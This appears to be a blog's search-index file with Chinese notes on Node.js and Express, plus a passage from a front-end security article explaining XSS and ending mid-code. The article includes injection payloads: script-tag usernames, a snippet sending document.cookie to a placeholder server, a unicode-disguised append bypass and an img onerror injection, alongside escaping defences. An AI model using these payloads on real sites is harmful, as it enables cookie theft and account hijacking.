<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Node学习笔记（module-3）]]></title>
    <url>%2F2018%2F01%2F27%2Fnode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3%2F</url>
    <content type="text"><![CDATA[Express框架概览Express框架是后台的Node框架，所以和jQuery、zepto、yui、bootstrap都不一个东西。Express在后台的受欢迎的程度，和jQuery一样，就是企业的事实上的标准。 原生Node开发，会发现有很多问题。比如： 呈递静态页面很不方便，需要处理每个HTTP请求，还要考虑304问题 路由处理代码不直观清晰，需要写很多正则表达式和字符串函数 不能集中精力写业务，要考虑很多其他的东西 EXPRESS的哲学是在你的想法和服务器之间充当薄薄的一层。这并不意味着他不够健壮，或者没有足够的有用特性，而是尽量少干预你，让你充分表达自己的思想，同时提供一些有用的东西。 英语官网：http://expressjs.com/中文官网：http://www.expressjs.com.cn/ 安装安装Express框架，就是使用npm的命令。 npm install --save express –save参数，表示自动修改package.json文件，自动添加依赖项。 路由能力：123456789101112131415161718192021var express = require(&quot;express&quot;);var app = express();app.get(&quot;/&quot;,function(req,res)&#123; res.send(&quot;你好&quot;);&#125;);app.get(&quot;/haha&quot;,function(req,res)&#123; res.send(&quot;这是haha页面，哈哈哈哈哈哈&quot;);&#125;);app.get(/^\/student\/([\d]&#123;10&#125;)$/,function(req,res)&#123; res.send(&quot;学生信息，学号&quot; + req.params[0]);&#125;);app.get(&quot;/teacher/:gonghao&quot;,function(req,res)&#123; res.send(&quot;老师信息，工号&quot; + req.params.gonghao);&#125;);app.listen(3000); 静态文件伺服能力：1app.use(express.static(&quot;./public&quot;)); 模板引擎：12345678910111213var express = require(&quot;express&quot;);var app = express();app.set(&quot;view engine&quot;,&quot;ejs&quot;);app.get(&quot;/&quot;,function(req,res)&#123; res.render(&quot;haha&quot;,&#123; &quot;news&quot; : [&quot;我是小新闻啊&quot;,&quot;我也是啊&quot;,&quot;哈哈哈哈&quot;] &#125;);&#125;);app.listen(3000); 路由当用get请求访问一个网址的时候，做什么事情： 123app.get(&quot;网址&quot;,function(req,res)&#123; &#125;); 当用post访问一个网址的时候，做什么事情： 123app.post(&quot;网址&quot;,function(req,res)&#123; &#125;); 如果想处理这个网址的任何method的请求，那么写all 123app.all(&quot;/&quot;,function()&#123; &#125;); 这里的网址，不分大小写，也就是说，你路由是 123app.get(&quot;/AAb&quot;,function(req,res)&#123; res.send(&quot;你好&quot;);&#125;); 实际上小写的访问也行。 所有的GET参数，? 后面的都已经被忽略。 锚点#也被忽略你路由到/a ， 实际/a?id=2&amp;sex=nan 也能被处理。 正则表达式可以被使用。正则表达式中，未知部分用圆括号分组，然后可以用req.params[0]、[1]得到。req.params类数组对象。 123app.get(/^\/student\/([\d]&#123;10&#125;)$/,function(req,res)&#123; res.send(&quot;学生信息，学号&quot; + req.params[0]);&#125;); 冒号是更推荐的写法: 123456789app.get(&quot;/student/:id&quot;,function(req,res)&#123; var id = req.params[&quot;id&quot;]; var reg= /^[\d]&#123;6&#125;$/; //正则验证 if(reg.test(id))&#123; res.send(id); &#125;else&#123; res.send(&quot;请检查格式&quot;); &#125;&#125;); 表单可以自己提交到自己上: 12345678app.get(&quot;/&quot;,function(req,res)&#123; res.render(&quot;form&quot;);&#125;);app.post(&quot;/&quot;,function(req,res)&#123; //将数据添加进入数据库 res.send(&quot;成功&quot;);&#125;); 适合进行 RESTful路由设计。简单说，就是一个路径，但是http method不同，对这个页面的使用也不同。/student/345345 get 读取学生信息 add 添加学生信息 delete 删除学生新 中间件如果我的的get、post回调函数中，没有next参数，那么就匹配上第一个路由，就不会往下匹配了。如果想往下匹配的话，那么需要写next() 12345678app.get(&quot;/&quot;,function(req,res,next)&#123; console.log(&quot;1&quot;); next();&#125;);app.get(&quot;/&quot;,function(req,res)&#123; console.log(&quot;2&quot;);&#125;); 下面两个路由，感觉没有关系： 123456789app.get(&quot;/:username/:id&quot;,function(req,res)&#123; console.log(&quot;1&quot;); res.send(&quot;用户信息&quot; + req.params.username);&#125;);app.get(&quot;/admin/login&quot;,function(req,res)&#123; console.log(&quot;2&quot;); res.send(&quot;管理员登录&quot;);&#125;); 但是实际上冲突了，因为admin可以当做用户名 login可以当做id。 解决方法1：交换位置。 也就是说，express中所有的路由（中间件）的顺序至关重要。匹配上第一个，就不会往下匹配了。 具体的往上写，抽象的往下写。 123456789app.get(&quot;/admin/login&quot;,function(req,res)&#123; console.log(&quot;2&quot;); res.send(&quot;管理员登录&quot;);&#125;);app.get(&quot;/:username/:id&quot;,function(req,res)&#123; console.log(&quot;1&quot;); res.send(&quot;用户信息&quot; + req.params.username);&#125;); 解决方法2： 123456789101112131415app.get(&quot;/:username/:id&quot;,function(req,res,next)&#123; var username = req.params.username; //检索数据库，如果username不存在，那么next() if(检索数据库)&#123; console.log(&quot;1&quot;); res.send(&quot;用户信息&quot;); &#125;else&#123; next(); &#125;&#125;);app.get(&quot;/admin/login&quot;,function(req,res)&#123; console.log(&quot;2&quot;); res.send(&quot;管理员登录&quot;);&#125;); 路由get、post这些东西，就是中间件，中间件讲究顺序，匹配上第一个之后，就不会往后匹配了。next函数才能够继续往后匹配。 app.use()也是一个中间件。与get、post不同的是，他的网址不是精确匹配的。而是能够有小文件夹拓展的。比如网址： http://127.0.0.1:3000/admin/aa/bb/cc/dd 123456app.use(&quot;/admin&quot;,function(req,res)&#123; res.write(req.originalUrl + &quot;\n&quot;); // /admin/aa/bb/cc/dd res.write(req.baseUrl + &quot;\n&quot;); // /admin res.write(req.path + &quot;\n&quot;); // /aa/bb/cc/dd res.end(&quot;你好&quot;);&#125;); 如果写一个”/“ 12345//当你不写路径的时候，实际上就相当于&quot;/&quot;，就是所有网址app.use(function(req,res,next)&#123; console.log(new Date()); next();&#125;); app.use()就给了我们增加一些特定功能的便利场所。 实际上app.use()的东西，基本上都从第三方能得到。 大多数情况下，渲染内容用res.render()，将会根据views中的模板文件进行渲染。如果不想使用views文件夹，想自己设置文件夹名字，那么app.set(“views”,”aaaa”); 如果想写一个快速测试页，当然可以使用res.send()。这个函数将根据内容，自动帮我们设置了Content-Type头部和200状态码。send()只能用一次，和end一样。和end不一样在哪里？能够自动设置MIME类型。 如果想使用不同的状态码，可以： res.status(404).send(&#39;Sorry, we cannot find that!&#39;); 如果想使用不同的Content-Type，可以： res.set(&#39;Content-Type&#39;, &#39;text/html&#39;); GET请求和POST请求的参数 GET请求的参数在URL中，在原生Node中，需要使用url模块来识别参数字符串。在Express中，不需要使用url模块了。可以直接使用req.query对象。 POST请求在express中不能直接获得，必须使用body-parser模块。使用后，将可以用req.body得到参数。但是如果表单中含有文件上传，那么还是需要使用formidable模块。 Node中全是回调函数，所以我们自己封装的函数，里面如果有异步的方法，比如I/O，那么就要用回调函数的方法封装。 错误：123res.reder(&quot;index&quot;,&#123; &quot;name&quot; : student.getDetailById(234234).name&#125;); 正确:12345student.getDetailByXueHao(234234,function(detail)&#123; res.render(&quot;index&quot;,&#123; &quot;name&quot; : detail.name &#125;)&#125;);]]></content>
      <categories>
        <category>Node</category>
      </categories>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node学习笔记（module-2）]]></title>
    <url>%2F2018%2F01%2F27%2Fnode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2%2F</url>
    <content type="text"><![CDATA[模块 在Node.js中，以模块为单位划分所有功能，并且提供了一个完整的模块加载机制，这时的我们可以将应用程序划分为各个不同的部分。不可能用一个js文件去写全部的业务。肯定要有MVC。 狭义的说，每一个JavaScript文件都是一个模块；而多个JavaScript文件之间可以相互require，他们共同实现了一个功能，他们整体对外，又称为一个广义上的模块。 Node.js中，一个JavaScript文件中定义的变量、函数，都只在这个文件内部有效。当需要从此JS文件外部引用这些变量、函数时，必须使用exports对象进行暴露。使用者要用require()命令引用这个JS文件。 foo.js文件中的代码：123var msg = &quot;你好&quot;;exports.msg = msg; msg这个变量，是一个js文件内部才有作用域的变量。如果别人想用这个变量，那么就要用exports进行暴露。 使用者：123var foo = require(&quot;./test/foo.js&quot;);console.log(foo.msg); 使用者用foo来接收exports对象，也就是说，这里的foo变量，就是文件中的exports变量。 一个JavaScript文件，可以向外exports无数个变量、函数。但是require的时候，仅仅需要require这个JS文件一次。使用的它的变量、函数的时候，用点语法即可。所以，无形之中，增加了一个顶层命名空间。 js文件中，可以用exports暴露很多东西，比如函数、变量。 12345678910var msg = &quot;你好&quot;;var info = &quot;呵呵&quot;;function showInfo()&#123; console.log(info);&#125;exports.msg = msg;exports.info = info;exports.showInfo = showInfo; 在使用者中，只需要require一次。 1var foo = require(&quot;./test/foo.js&quot;); 相当于增加了顶层变量。所有的函数、变量都要从这个顶层变量走：12345console.log(foo.msg);console.log(foo.info);foo.showInfo(); Node中，js文件和js文件，就是被一个个exports和require构建成为网状的。不是靠html文件统一在一起的。 可以将一个JavaScript文件中，描述一个类。用module.export = 构造函数名;的方式向外暴露一个类。 也就是说，js文件和js文件之间有两种合作的模式： 某一个js文件中，提供了函数，供别人使用。 只需要暴露函数就行了； exports.msg=msg; 某一个js文件，描述了一个类。 module.exports = People; 如果在require命令中，这么写:var foo = require(&quot;foo.js&quot;); //没有写./， 所以不是一个相对路径。是一个特殊的路径那么Node.js将该文件视为node_modules目录下的一个文件 node_modules文件夹并不一定在同级目录里面，在任何直接祖先级目录中，都可以。甚至可以放到NODE_PATH环境变量的文件夹中。这样做的好处稍后你将知道：分享项目的时候，不需要带着modules一起给别人。 我们可以使用文件夹来管理模块，比如var bar = require(&quot;bar&quot;);那么Node.js将会去寻找node_modules目录下的bar文件夹中的index.js去执行。 每一个模块文件夹中，推荐都写一个package.json文件，这个文件的名字不能改。node将自动读取里面的配置。有一个main项，就是入口文件： 12345&#123; &quot;name&quot;: &quot;kaoladebar&quot;, &quot;version&quot;: &quot;1.0.1&quot;, &quot;main&quot; : &quot;app.js&quot;&#125; package.json文件，要放到模块文件夹的根目录去。 模块就是一些功能的封装，所以一些成熟的、经常使用的功能，都有人封装成为了模块。并且放到了社区中，供人免费下载。这个伟大的社区，叫做npm。 也是一个工具名字 node package managementhttps://www.npmjs.com/ 去社区搜索需求，然后点进去，看api。如果要配置一个模块，那么直接在cmd使用 1npm install 模块名字 就可以安装。 模块名字全球唯一。安装的时候，要注意，命令提示符的所在位置。 我们的依赖包，可能在随时更新，我们永远想保持更新，或者某持某一个版本； 项目越来越大的时候，给别人看的时候，没有必要再次共享我们引用的第三方模块。 我们可以用package.json来管理依赖。在cmd中，使用npm init可以初始化一个package.json文件，用回答问题的方式生成一个新的package.json文件。 使用npm install将能安装所有依赖。npm也有文档，这是package.json的介绍：https://docs.npmjs.com/files/package.json require()别的js文件的时候，将执行那个js文件。 注意：require()中的路径，是从当前这个js文件出发，找到别人。而fs是从命令提示符所在目录出发找到别人。所以，桌面上有一个a.js， test文件夹中有b.js、c.js、1.txt a要引用b：1var b = require(“./test/b.js”); b要引用c：1var b = require(“./c.js”); 但是，fs等其他的模块用到路径的时候，都是相对于cmd命令光标所在位置。所以，在b.js中想读1.txt文件，推荐用绝对路径： 1234fs.readFile(__dirname + &quot;/1.txt&quot;,function(err,data)&#123; if(err) &#123; throw err; &#125; console.log(data.toString());&#125;); post请求123456789101112var alldata = &quot;&quot;;//下面是post请求接收的一个公式//node为了追求极致，它是一个小段一个小段接收的。//接受了一小段，可能就给别人去服务了。防止一个过大的表单阻塞了整个进程req.addListener(&quot;data&quot;,function(chunk)&#123; alldata += chunk;&#125;);//全部传输完毕req.addListener(&quot;end&quot;,function()&#123; console.log(alldata.toString()); res.end(&quot;success&quot;);&#125;); 原生写POST处理，比较复杂，要写两个监听。文件上传业务比较难写。所以，用第三方模块。formidable。 只要涉及文件上传，那么form标签要加一个属性： 1&lt;form action=&quot;http://127.0.0.1/dopost&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; 模板引擎1&lt;a href=&quot;&lt;%= url %&gt;&quot;&gt;&lt;img src=&quot;&lt;%= imageURL %&gt;&quot; alt=&quot;&quot;&gt;&lt;/a&gt; 数据绑定，就成为一个完整的html字符串了。前台的模板，我们现在要学习的是后台的模板。后台模板，著名的有两个，第一个叫做ejs； 第二个叫做jade。 是npm第三方包。 EJSEmbedded JavaScript templates后台模板引擎 12345&lt;ul&gt; &lt;% for(var i = 0 ; i &lt; news.length ; i++)&#123; %&gt; &lt;li&gt;&lt;%= news[i] %&gt;&lt;/li&gt; &lt;% &#125; %&gt;&lt;/ul&gt; 1234var dictionary = &#123; a:6, news : [&quot;1期班太牛逼了&quot;,&quot;高薪就业&quot;,&quot;哈哈哈哈哈&quot;]&#125;; 1234567891011121314151617181920212223242526272829/** * Created by Danny on 2015/9/20 16:59. */var ejs = require(&quot;ejs&quot;);var fs = require(&quot;fs&quot;);var http = require(&quot;http&quot;);var server = http.createServer(function(req,res)&#123; fs.readFile(&quot;./views/index.ejs&quot;,function(err,data)&#123; //绑定模板 var template = data.toString(); var dictionary = &#123; a:6, news : [ &#123;&quot;title&quot;:&quot;陈伟我爱你&quot;,&quot;count&quot;:10&#125;, &#123;&quot;title&quot;:&quot;哈哈哈哈&quot;,&quot;count&quot;:20&#125;, &#123;&quot;title&quot;:&quot;逗你玩儿的&quot;,&quot;count&quot;:30&#125; ] &#125;; var html = ejs.render(template,dictionary); //显示 res.writeHead(200,&#123;&quot;Content-Type&quot;:&quot;text/html;charset=UTF8&quot;&#125;); res.end(html); &#125;);&#125;);server.listen(80,&quot;127.0.0.1&quot;); ejs详解：npm：https://www.npmjs.com/package/ejs中文版，译者：飞龙 jadehttps://www.npmjs.com/package/jade草依山 翻译]]></content>
      <categories>
        <category>Node</category>
      </categories>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node学习笔记（module-1）]]></title>
    <url>%2F2018%2F01%2F27%2Fnode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1%2F</url>
    <content type="text"><![CDATA[Node.js简介简介Node.js是一个让JavaScript运行在服务器端的开发平台，它让JavaScript的触角伸到了服务器端，可以与PHP、JSP、Python、Ruby平起平坐。但Node似乎有点不同： Node.js不是一种独立的语言，与PHP、JSP、Python、Perl、Ruby的“既是语言，也是平台”不同，Node.js的使用JavaScript进行编程，运行在JavaScript引擎上（V8）。 与PHP、JSP等相比（PHP、JSP、.net都需要运行在服务器程序上，Apache、Naginx、Tomcat、IIS。），Node.js跳过了Apache、Naginx、IIS等HTTP服务器，它自己不用建设在任何服务器软件之上。Node.js的许多设计理念与经典架构（LAMP = Linux + Apache + MySQL + PHP）有着很大的不同，可以提供强大的伸缩能力。一会儿我们就将看到，Node.js没有web容器。 Node.js自身哲学，是花最小的硬件成本，追求更高的并发，更高的处理性能。 特点所谓的特点，就是Node.js是如何解决服务器高性能瓶颈问题的。 单线程在Java、PHP或者.net等服务器端语言中，会为每一个客户端连接创建一个新的线程。而每个线程需要耗费大约2MB内存。也就是说，理论上，一个8GB内存的服务器可以同时连接的最大用户数为4000个左右。要让Web应用程序支持更多的用户，就需要增加服务器的数量，而Web应用程序的硬件成本当然就上升了。Node.js不为每个客户连接创建一个新的线程，而仅仅使用一个线程。当有用户连接了，就触发一个内部事件，通过非阻塞I/O、事件驱动机制，让Node.js程序宏观上也是并行的。使用Node.js，一个8GB内存的服务器，可以同时处理超过4万用户的连接。另外，单线程的带来的好处，还有操作系统完全不再有线程创建、销毁的时间开销。坏处，就是一个用户造成了线程的崩溃，整个服务都崩溃了，其他人也崩溃了。 也就是说，单线程也能造成宏观上的“并发”。 非阻塞I/O non-blocking I/O例如，当在访问数据库取得数据的时候，需要一段时间。在传统的单线程处理机制中，在执行了访问数据库代码之后，整个线程都将暂停下来，等待数据库返回结果，才能执行后面的代码。也就是说，I/O阻塞了代码的执行，极大地降低了程序的执行效率。由于Node.js中采用了非阻塞型I/O机制，因此在执行了访问数据库的代码之后，将立即转而执行其后面的代码，把数据库返回结果的处理代码放在回调函数中，从而提高了程序的执行效率。当某个I/O执行完毕时，将以事件的形式通知执行I/O操作的线程，线程执行这个事件的回调函数。为了处理异步I/O，线程必须有事件循环，不断的检查有没有未处理的事件，依次予以处理。阻塞模式下，一个线程只能处理一项任务，要想提高吞吐量必须通过多线程。而非阻塞模式下，一个线程永远在执行计算操作，这个线程的CPU核心利用率永远是100%。所以，这是一种特别有哲理的解决方案：与其人多，但是好多人闲着；还不如一个人玩命，往死里干活儿。 事件驱动event-driven在Node中，客户端请求建立连接，提交数据等行为，会触发相应的事件。在Node中，在一个时刻，只能执行一个事件回调函数，但是在执行一个事件回调函数的中途，可以转而处理其他事件（比如，又有新用户连接了），然后返回继续执行原事件的回调函数，这种处理机制，称为“事件环”机制。Node.js底层是C++（V8也是C++写的）。底层代码中，近半数都用于事件队列、回调函数队列的构建。用事件驱动来完成服务器的任务调度，这是鬼才才能想到的。针尖上的舞蹈，用一个线程，担负起了处理非常多的任务的使命。 单线程，：单线程的好处，减少了内存开销，操作系统的内存换页。如果某一个事情，进入了，但是被I/O阻塞了，所以这个线程就阻塞了。非阻塞I/O， ：不会傻等I/O语句结束，而会执行后面的语句。非阻塞就能解决问题了么？比如执行着小红的业务，执行过程中，小刚的I/O回调完成了，此时怎么办？？事件机制，事件环，：不管是新用户的请求，还是老用户的I/O完成，都将以事件方式加入事件环，等待调度。 说是三个特点，实际上是一个特点，离开谁都不行，都玩儿不转了。Node.js很像抠门的餐厅老板，只聘请1个服务员，服务很多人。结果，比很多服务员效率还高。Node.js中所有的I/O都是异步的，回调函数，套回调函数。 适合开发什么Node.js适合用来开发什么样的应用程序呢？善于I/O，不善于计算。因为Node.js最擅长的就是任务调度，如果你的业务有很多的CPU计算，实际上也相当于这个计算阻塞了这个单线程，就不适合Node开发。当应用程序需要处理大量并发的I/O，而在向客户端发出响应之前，应用程序内部并不需要进行非常复杂的处理的时候，Node.js非常适合。Node.js也非常适合与web socket配合，开发长连接的实时交互应用程序。 比如： 用户表单收集 考试系统 聊天室 图文直播 提供JSON的API（为前台Angular使用） Node.js安装Node.js和Java非常像，跨平台的。不管是Linux还是windows编程是完全一致的（有一些不一样，比如路径的表述）。Linux版本的Node.js环境和windows环境是不一样的，但是编程语言一样。很像Java虚拟机。 node 路径名推荐，不要使用完整的路径名，而是通过先进入案例文件夹，然后node相对地址cd命令，就是change directory的缩写，表示更改当前目录。 Node.js是服务器的程序，写的js语句，都将运行在服务器上。返回给客户的，都是已经处理好的纯html。 123456789101112//require表示引包，引包就是引用自己的一个特殊功能var http = require(&quot;http&quot;);//创建服务器，参数是一个回调函数，表示如果有请求进来，要做什么var server = http.createServer(function(req,res)&#123; //req表示请求，request; res表示响应，response //设置HTTP头部，状态码是200，文件类型是html，字符集是utf8 res.writeHead(200,&#123;&quot;Content-type&quot;:&quot;text/html;charset=UTF-8&quot;&#125;); res.end(&quot;哈哈哈哈，我买了一个iPhone&quot; + (1+2+3) + &quot;s&quot;);&#125;);//运行服务器，监听3000端口（端口号可以任改）server.listen(3000,&quot;127.0.0.1&quot;); 如果想修改程序，必须中断当前运行的服务器，重新node一次，刷新，才行。ctrl+c，就可以打断挂起的服务器程序。此时按上箭头，能够快速调用最近的node命令。 你会发现，我们本地写一个js，打死都不能直接拖入浏览器运行，但是有了node，我们任何一个js文件，都可以通过node来运行。也就是说，node就是一个js的执行环境。我们现在，要跑起来一个服务器，这个服务器的脚本，要以.js存储。是一个js文件。用node命令运行这个js文件罢了。 Node.js没有根目录的概念，因为它根本没有任何的web容器！ 让node.js提供一个静态服务，都非常难！也就是说，node.js中，如果看见一个网址是 127.0.0.1:3000/fang 别再去想，一定有一个文件夹，叫做fang了。可能/fang的物理文件，是同目录的test.htmlURL和真实物理文件，是没有关系的。URL是通过了Node的顶层路由设计，呈递某一个静态文件的。 HTTP模块Node.js中，将很多的功能，划分为了一个个mudule，大陆的书翻译为模块；台湾的书，翻译为模组。这是因为，有一些程序需要使用fs功能（文件读取功能），有一些不用的，所以为了效率，你用啥，你就require啥。 123456789101112//这个案例简单讲解http模块//引用模块var http = require(&quot;http&quot;);//创建一个服务器，回调函数表示接收到请求之后做的事情var server = http.createServer(function(req,res)&#123; //req参数表示请求，res表示响应 console.log(&quot;服务器接收到了请求&quot; + req.url); res.end();&#125;);//监听端口server.listen(3000,&quot;127.0.0.1&quot;); 设置一个响应头： res.writeHead(200,{&quot;Content-Type&quot;:&quot;text/plain;charset=UTF8&quot;}); 我们现在来看一下req里面能够使用的东西。最关键的就是req.url属性，表示用户的请求URL地址。所有的路由设计，都是通过req.url来实现的。我们比较关心的不是拿到URL，而是识别这个URL。识别URL，用到两个新模块，第一个就是url模块，第二个就是querystring模块 字符串查询，用querystring处理 12345678910querystring.parse(&apos;foo=bar&amp;baz=qux&amp;baz=quux&amp;corge&apos;)// returns&#123; foo: &apos;bar&apos;, baz: [&apos;qux&apos;, &apos;quux&apos;], corge: &apos;&apos; &#125;// Suppose gbkDecodeURIComponent function already exists,// it can decode `gbk` encoding stringquerystring.parse(&apos;w=%D6%D0%CE%C4&amp;foo=bar&apos;, null, null, &#123; decodeURIComponent: gbkDecodeURIComponent &#125;)// returns&#123; w: &apos;中文&apos;, foo: &apos;bar&apos; &#125;]]></content>
      <categories>
        <category>Node</category>
      </categories>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊一聊WEB前端安全那些事儿]]></title>
    <url>%2F2018%2F01%2F17%2F%E8%81%8A%E4%B8%80%E8%81%8AWEB%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%2F</url>
    <content type="text"><![CDATA[随着互联网的发达，各种WEB应用也变得越来越复杂，满足了用户的各种需求，但是随之而来的就是各种网络安全的问题。作为前端工程师的我们也逃不开这个问题。所以今天，就和大家一起聊一聊WEB前端的安全那些事儿。这里不去说那些后端的攻击(SQL注入、DDOS攻击等)，毕竟整个WEB安全是一门很深的学问，不是我一篇文章就能完全说完的。我们就聊一聊前端工程师们需要注意的那些安全知识。 为什么要攻击?其实真正为了玩的心态去进行黑网站的人，还是少数。多数攻击还是有利益的成分在里面的。我模糊的记得，以前听腾讯的工程师说过一句话，大概是这样的：开发者不可能确保自己的应用绝对无法被攻击，但是只要攻击我们的时候，黑客花费的成本远比他可以获取的利益大得多，黑客就不会去攻击。防范强如支付宝、QQ等产品，也都曾被报过漏洞，看来防御不是绝对的，我们只能想办法让我们的应用更加安全。 前端攻击都有哪些形式，我该如何防范？XSS攻击是什么？百度百科中如是说道：XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。其实在web前端方面，可以简单的理解为一种javascript代码注入。举个例子，我们有个社交网站，允许大家相互访问空间，网站可能是这样做的： 1234567891011121314151617181920212223&lt;?php $username="侯医生";?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo $username;?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 运行时，展现形式如图1.1.1所示： 但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下，效果如图1.1.2 123&lt;?php $username=&quot;&lt;script&gt;alert(&apos;侯医生&apos;);&lt;/script&gt;&quot;;?&gt; 如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码： 12345$.ajax(&#123; url: &apos;自己的服务器&apos;, dataType: &apos;jsonp&apos;, data: &#123;&apos;盗取的用户cookie&apos;: document.cookie&#125;&#125;); 再在各个QQ群中，散播自己的空间，引诱别人来访问。就可以拿到用户在这个域名下的cookie或者其他隐私了。 如何防范？目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图1.2.1 123456789101112131415161718192021222324&lt;?php $username=&quot;&lt;script&gt;alert(&apos;侯医生&apos;);&lt;/script&gt;&quot;;?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码--&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 其实，我们再来看看网页源码，如图1.2.2 虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(&gt;&lt;)，均被转义为html字符实体，所以，便不会被当做标签来解析的，但是实际显示的时候，这两个尖括号，还是可以正常展示的。 升级攻击append的利用:上一小节我们防住了script标签的左右尖括号，蓝鹅，聪明的黑客们还是想出了好办法去破解，我们知道，直接给innerHTML赋值一段js，是无法被执行的。比如: 1$(&apos;div&apos;).innerHTML = &apos;&lt;script&gt;alert(&quot;okok&quot;);&lt;/script&gt;&apos;; 但是，jquery的append可以做到，究其原因，就是因为jquery会在将append元素变为fragment的时候，找到其中的script标签，再使用eval执行一遍。jquery的append使用的方式也是innerHTML(如图1.3.1.1)。而innerHTML是会将unicode码转换为字符实体的。 利用这两种知识结合，我们可以得出，网站使用append进行dom操作，如果是append我们可以决定的字段，那么我们可以将左右尖括号，使用unicode码伪装起来，就像这样–”\u003cscript\u003ealert(‘okok’);”。接下来转义的时候，伪装成\u003的&lt;会被漏掉，append的时候，则会被重新调用。代码如下，效果如图1.3.1.2 12345678910111213141516171819202122232425262728&lt;?php $username=&quot;\u003cscript\u003ealert(&apos;okok&apos;);&quot;;?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;div&gt;版权所有：&lt;span id=&quot;username_info&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;script&gt; $(&apos;#username_info&apos;).append(&quot;&lt;?php echo htmlentities($username);?&gt;&quot;); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 我们可以看到，虽然进行了转义，注入的代码还是会再次被执行。 img标签的再次利用再来一种攻击方式，img标签的小贴士。这里我们需要重温一个小知识点—–img标签，在加载图片失败的时候，会调用该元素上的onerror事件。我们正可以利用这种方式来进行攻击。我们先来看一下，正常的用户分享图片的行为怎么做。代码如下，展示如图1.3.2.1 12345678910111213141516171819202122232425&lt;?php $username=&quot;&lt;script&gt;alert(&apos;侯医生&apos;);&lt;/script&gt;&quot;; $imgsrc=&quot;http://img5.imgtn.bdimg.com/it/u=1412369044,967882675&amp;fm=11&amp;gp=0.jpg&quot;;?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1，这个是图片： &lt;img src=&quot;&lt;?php echo $imgsrc;?&gt;&quot; /&gt; &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 但是，如果这张图片的地址我们换种写法呢？ 123&lt;?php $imgsrc=&quot;\&quot; onerror=\&quot;javascript:alert(&apos;侯医生&apos;);\&quot;&quot;;?&gt; 我们再来看看拼装好的html源码，如图1.3.2.2： 这时的源码已经变为–src为空，但是onerror的时候，执行注入代码。我们刷新查看页面，就会发现，代码注入已经成功，如图1.3.2.3所示： 看官你可能会说了，再转义呗。是的，老套路，我们接着进行转义—你这个毛病呀，就算治好了(老中医口吻)。 1&lt;img src=&quot;&lt;?php echo htmlentities($imgsrc);?&gt;&quot; /&gt; 恩，总算是恢复正常了，如图1.3.2.4所示。 组合使用但是……但是，道高一尺魔高一丈，虽然防住了img标签直接的输出，但是我们的攻击点又来了，我们将1.3.1中所说的方式与1.3.2中所说的方式进行结合，进行一种组合式攻击，我们之前说过，innerHTML赋值的script标签，不会被执行，但是innerHTML赋值一个img标签是可以被识别的。我们把img标签的左右尖括号，使用unicode进行伪装，让转义方法认不出来，即使innerHTML也可以利用上了，代码如下，效果如图1.3.3.1 123456789101112131415161718192021222324252627&lt;?php 